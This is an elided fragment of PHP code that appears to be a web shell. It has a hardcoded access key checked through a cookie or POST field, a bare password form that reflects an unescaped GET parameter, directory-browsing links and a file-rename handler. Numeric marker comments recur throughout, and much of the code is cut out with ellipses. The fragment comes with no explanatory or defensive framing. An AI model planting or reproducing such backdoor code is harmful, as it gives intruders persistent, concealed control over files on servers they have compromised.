...
$auth_key = "f2b94750b43a5211a47dc7dfdb6cc601";
...
$pass = false;
if (isset($_COOKIE['pw_name_92617'])) {
    if(($_COOKIE['pw_name_92617']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_92617'])) {
        if(($_POST['pw_name_92617']) == $auth_key) {
            setcookie("pw_name_92617", $_POST['pw_name_92617']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_92617' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724642911222705 1724642911744181 1724642911221957 1724642911152864
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724642911222705 1724642911744181 1724642911221957 1724642911152864
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724642911222705 1724642911744181 1724642911221957 1724642911152864
            $name = PATH . "/" . $_GET['r'];
